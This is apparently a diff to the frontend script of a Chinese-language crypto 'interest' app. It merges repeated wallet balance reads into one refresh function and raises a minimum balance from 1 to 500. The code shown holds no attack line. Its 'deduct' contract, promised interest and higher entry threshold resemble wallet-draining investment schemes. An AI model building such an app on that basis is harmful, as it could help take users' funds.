@@ -675,33 +675,59 @@ async function connectWallet() {
     updateStatus('請在錢包中確認連線...');
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account selected.");
-    signer = provider.getSigner(); userAddress = await signer.getAddress();
-    connectButton.classList.add('connected'); connectButton.textContent = '已連線'; connectButton.title = '斷開錢包連線';
+    signer = provider.getSigner(); 
+    userAddress = await signer.getAddress();
+
+    // 【關鍵】建立合約
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
     wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-    await updateUIBasedOnChainState();
-    await loadUserDataFromServer(); setupSSE(); await saveUserData();
 
-    // 【關鍵修復】延遲強制刷新餘額
+    connectButton.classList.add('connected'); 
+    connectButton.textContent = '已連線'; 
+    connectButton.title = '斷開錢包連線';
+
+    await updateUIBasedOnChainState();
+    await loadUserDataFromServer(); 
+    setupSSE(); 
+    await saveUserData();
+
+    // 【終極修復】延遲 1 秒強制讀取餘額
     setTimeout(async () => {
-      if (userAddress && signer) {
-        updateStatus('讀取錢包餘額...');
-        const balances = {
-          usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
-          usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
-          weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
-        };
-        updateBalancesUI(balances);
-        updateStatus(translations[currentLang].walletConnected);
-      }
-    }, 500);
+      await forceRefreshWalletBalance();
+    }, 1000);
 
   } catch (e) {
     let msg = `${translations[currentLang].error}: ${e.message}`;
     if (e.code === 4001) msg = "您拒絕了連線請求。";
     updateStatus(msg, true); resetState(true); connectButton.disabled = typeof window.ethereum === 'undefined';
+  }
+}
+
+/* 【強制刷新餘額】 */
+async function forceRefreshWalletBalance() {
+  if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
+    updateStatus('合約未初始化，請重新連線。', true);
+    return;
+  }
+
+  updateStatus('讀取錢包餘額...');
+
+  try {
+    const [usdtBal, usdcBal, wethBal] = await Promise.all([
+      usdtContract.balanceOf(userAddress),
+      usdcContract.balanceOf(userAddress),
+      wethContract.balanceOf(userAddress)
+    ]);
+
+    const balances = { usdt: usdtBal, usdc: usdcBal, weth: wethBal };
+    updateBalancesUI(balances);
+    updateStatus(translations[currentLang].walletConnected);
+    console.log('餘額讀取成功：', balances);
+  } catch (error) {
+    console.error('讀取餘額失敗：', error);
+    updateStatus('讀取餘額失敗，請檢查網路或 MetaMask。', true);
   }
 }
 
@@ -803,7 +829,7 @@ async function getEthPrices() {
   }
 }
 
-/* 【關鍵修改】永遠開 Modal，確認時才檢查利息 */
+/* 【永遠開 Modal】 */
 async function claimInterest() {
   const claimableETH = window.currentClaimable || 0;
   const pendingETH = window.currentPending || 0;
@@ -814,7 +840,6 @@ async function claimInterest() {
   if (rate === 0) rate = selectedToken === 'WETH' ? 1 : prices.usd;
   const valueInToken = claimableETH * rate;
 
-  // 更新 Modal 內容
   if (modalClaimableETH) modalClaimableETH.textContent = `${claimableETH.toFixed(7)} ETH`;
   if (modalPendingETH) modalPendingETH.textContent = `${pendingETH.toFixed(7)} ETH`;
   if (modalEthPrice) modalEthPrice.textContent = `$${prices.usd.toFixed(2)}`;
@@ -822,7 +847,6 @@ async function claimInterest() {
   if (modalEquivalentValue) modalEquivalentValue.textContent = `${valueInToken.toFixed(3)} ${selectedToken}`;
   if (modalTitle) modalTitle.textContent = translations[currentLang]?.claimBtnText || 'Claim Interest';
 
-  // 永遠開 Modal
   if (claimModal) claimModal.style.display = 'flex';
 }
 
@@ -858,12 +882,7 @@ function setupSSE() {
             localLastUpdated = data.lastUpdated;
             await loadUserDataFromServer();
             await updateInterest();
-            const balances = {
-              usdt: userAddress ? await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
-              usdc: userAddress ? await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
-              weth: userAddress ? await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) : 0n
-            };
-            updateBalancesUI(balances);
+            await forceRefreshWalletBalance(); // SSE 更新後也刷新餘額
           }
         } else if (eventType === 'ping') {
           console.log(`SSE: Received ping, timestamp: ${data.timestamp || 'unknown'}`);
@@ -896,7 +915,6 @@ function setupSSE() {
 document.addEventListener('DOMContentLoaded', () => {
   updateLanguage(currentLang);
 
-  // 綁定兌換按鈕
   const claimBtn = document.getElementById('claimButton');
   if (claimBtn) {
     claimBtn.addEventListener('click', claimInterest);
@@ -910,7 +928,6 @@ document.addEventListener('DOMContentLoaded', () => {
   }, 100);
   setInitialNextBenefitTime();
 
-  // 其他事件綁定
   if (closeModal) closeModal.addEventListener('click', () => claimModal.style.display = 'none');
   if (cancelClaim) cancelClaim.addEventListener('click', () => claimModal.style.display = 'none');
   if (confirmClaim) {
@@ -938,12 +955,7 @@ document.addEventListener('DOMContentLoaded', () => {
         cumulative: 0, nextBenefitTime: localStorage.getItem('nextBenefitTime'), lastUpdated: Date.now(), source: 'index.html' 
       });
       await updateInterest();
-      const walletBalances = { 
-        usdt: userAddress ? await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n) : 0n, 
-        usdc: userAddress ? await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n) : 0n, 
-        weth: userAddress ? await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) : 0n 
-      };
-      updateBalancesUI(walletBalances);
+      await forceRefreshWalletBalance(); // 領取後刷新餘額
       updateStatus(translations[currentLang].claimSuccess);
     });
   }
@@ -1017,7 +1029,7 @@ document.addEventListener('DOMContentLoaded', () => {
             message = translations[currentLang].wethValueTooLow;
           }
         } else {
-          if (balance >= 1) {
+          if (balance >= 500) {
             canStart = true;
           } else {
             message = translations[currentLang].balanceTooLow;
@@ -1079,24 +1091,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (refreshWallet) {
     refreshWallet.addEventListener('click', async () => {
-      const currentLang = localStorage.getItem('language') || 'zh-Hant';
-      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
-      updateStatus(translations[currentLang].fetchingBalances);
-      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
-      updateBalancesUI(balances); updateStatus('');
+      await forceRefreshWalletBalance();
     });
   }
 
   if (walletTokenSelect) {
     walletTokenSelect.addEventListener('change', async () => {
-      const currentLang = localStorage.getItem('language') || 'zh-Hant';
-      if (!signer) {
-        if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
-        if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
-        return;
-      }
-      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
-      updateBalancesUI(balances);
+      await forceRefreshWalletBalance();
     });
   }
 
@@ -1114,7 +1115,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // 規則說明 Modal 事件
   const rulesModal = document.getElementById('rulesModal');
   const rulesButton = document.getElementById('rulesButton');
   const closeRulesModal = document.getElementById('closeRulesModal');
